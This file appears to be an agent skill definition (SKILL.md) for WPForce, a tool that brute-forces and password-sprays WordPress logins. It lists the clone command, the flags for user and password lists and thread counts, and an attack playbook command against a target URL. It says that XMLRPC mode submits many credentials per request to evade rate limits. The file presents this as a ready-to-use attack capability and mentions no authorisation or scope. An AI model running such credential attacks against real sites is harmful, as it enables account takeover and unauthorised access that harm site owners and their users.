---
name: wpforce-login
description: "WPForce: WP backend brute force. Signals: brute force, password spraying, WP login brute force, threads, XMLRPC mode."
zh-signals: "WPForce: WP 后台爆破。信号:暴力破解,口令喷射,WP 登录爆破,线程,XMLRPC 模式。"
when-to-use: >-
  Use to brute force or spray credentials against a WordPress login page, optionally via XMLRPC to submit multiple credentials per request and evade rate limits.
---

# WPForce

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/n00py/WPForce
- Upstream License: BSD-2-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/n00py/WPForce
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python wpforce.py -u https://t.com -w users.txt -p pass.txt` | WP login brute force |
| `-u url -w u.txt -p p.txt -t 20` | Threads |
| `--xmlrpc` | XMLRPC mode |

## Attack Scenario Playbook

### WP backend brute force

```bash
python wpforce.py -u https://t.com -w users.txt -p top100.txt
# xmlrpc multi-threaded mode bypasses login rate limits
```

## Notes

WordPress login brute force; XMLRPC mode supports submitting multiple credentials per request.
